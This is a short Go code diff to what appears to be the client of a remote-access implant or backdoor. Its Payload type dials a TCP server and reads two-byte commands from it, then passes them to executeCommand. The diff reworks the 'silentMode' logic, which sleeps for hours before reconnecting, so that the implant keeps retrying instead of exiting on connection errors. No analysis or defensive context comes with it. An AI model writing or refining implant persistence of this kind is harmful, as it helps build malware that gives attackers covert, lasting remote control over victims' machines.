@@ -9,7 +9,6 @@ import (
 	"os/exec"
 	"strconv"
 	"strings"
-	"sync"
 	"time"
 )
 
@@ -31,11 +30,11 @@ func (p *Payload) Run() {
 	conn, err := net.Dial("tcp", addr)
 	if err != nil {
 		fmt.Println("[ERROR] dialing connection", err)
+		p.silentMode()
 	}
 	defer conn.Close()
 
 	p.Conn = conn
-	wg := new(sync.WaitGroup)
 
 	for {
 		// commandByteBuffer is the firt 2 bytes being sent by the server
@@ -44,9 +43,7 @@ func (p *Payload) Run() {
 		commandByteBuffer := make([]byte, 2)
 		_, err := p.Conn.Read(commandByteBuffer)
 		if err != nil {
-			wg.Add(1)
-			go p.silentMode(wg)
-			break
+			p.silentMode()
 		}
 
 		switch {
@@ -58,11 +55,9 @@ func (p *Payload) Run() {
 			p.executeCommand(commandByteBuffer)
 		}
 	}
-	wg.Wait()
 }
 
-func (p *Payload) silentMode(wg *sync.WaitGroup) {
-	defer wg.Done()
+func (p *Payload) silentMode() {
 	time.Sleep(p.ReconnTime * time.Hour)
 
 	// reconnect
